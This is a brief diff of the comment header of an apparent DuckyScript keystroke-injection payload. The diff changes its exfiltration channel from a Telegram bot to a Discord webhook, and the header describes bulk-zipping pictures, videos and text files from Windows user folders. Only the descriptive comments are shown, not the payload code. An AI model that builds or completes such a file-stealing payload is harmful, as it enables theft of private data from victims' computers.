@@ -1,6 +1,6 @@
-REM Title: beigeworm's Exfiltrate files to Telegram.
+REM Title: beigeworm's Exfiltrate files to Discord.
 REM Author: @beigeworm
-REM Description: Using a Telegram Bot's Chat to receive all matching files in bulk zips of 50mb each. (searches user folders for pictures, video, text files etc..)
+REM Description: Using a Discord webhook to receive all matching files in bulk zips of 25mb each. (searches user folders for pictures, video, text files etc..)
 REM Target: Windows 10 and 11
 
 REM some setup for dukie script
